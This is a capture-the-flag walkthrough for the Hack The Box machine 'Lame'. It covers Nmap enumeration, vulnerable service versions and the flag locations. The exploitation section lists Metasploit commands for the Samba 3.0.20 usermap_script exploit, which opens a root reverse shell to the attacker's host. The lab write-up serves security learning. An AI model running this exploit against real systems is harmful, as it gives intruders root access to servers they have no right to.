## Lame Walkthrough

This is a walkthrough for the first easy machine in Hack the Box - Lame. This is a very simple machine to root and is good practice for anyone wanting to get into HTB.

---

### Enumeration
IP Address: 10.10.10.3

The first thing that I did was run an Nmap scan on the target. I got four open ports back, and we can also tell that this is a Linux machine:

![Screenshot from 2023-02-22 15-41-43](https://user-images.githubusercontent.com/126024971/220765714-b6a07831-ee73-466c-9b25-9e97a7610009.png)

After this I did research on potential vulnerabilities based on the running services.

`Port 21: vsftpd 2.3.4` This is running on port 21 as an FTP server. It has a module in metasploit, but it says that the backdoor was removed. This might still be worth checking out.

https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

`Port 22: OpenSSH 4.7p1` I was not able to find any exploits for this version of OpenSHH that I thought would be successful.

`Port 139: Samba smbd 3.X - 4.X` & `Port 445: Samba smbd 3.0.20` These services go hand-in-hand as they are running Samba. Samba 3.0.20 has a vulnerability assoicated with it that should give a remote shell with root access.

https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/

---

### Exploitation

`vsftp 2.3.4` The exploit for vsftp does not work (The HTB Offical walkthrough confirms this). While it does not work for this instance, it is a good exploit to keep in mind for the future if this version of vsftp comes up again.

`Port 139: Samba smbd 3.X - 4.X` & `Port 445: Samba smbd 3.0.20` This is how HTB wants you to root this machine. There is a metasploit module for this version of Samba that will give us a shell with root access. Here are the commands to run the exploit (They are also included in the rapid7 link):

NOTE: It is important for you to get your LHOST when you are running these metasploit modules. If you do not set the LHOST to the IP address that your HTB VPN is using, metasploit will default to your main IP address and you will not be able to connect to the target.

`mfsconsole`

`use exploit/multi/samba/usermap_script`

`show options`

`Set LHOST YOUR-HTB-VPN-IP`

`set RHOSTS 10.10.10.3`

`run`

After this, we have root access to the machine!
![Selection_002](https://user-images.githubusercontent.com/126024971/220772612-67f33199-7eb0-479e-a780-704c6c946a9e.png)

---

### Getting the Flags

Since we already have root access to the machine, we do not need to escalate privileges. All that is needed is to find where the user and root flags are located. I found the user flag in /home/makis/user.txt. If this is your first flag in HTB, you will need to use the `cat` command to list the contents of the txt file. After showing the flag, copy and paste it into the HTB site for the user flag.

![image](https://user-images.githubusercontent.com/126024971/220773457-3290e887-6ebd-44c0-823b-00c4942246eb.png)

The root flag is found under /root/root.txt

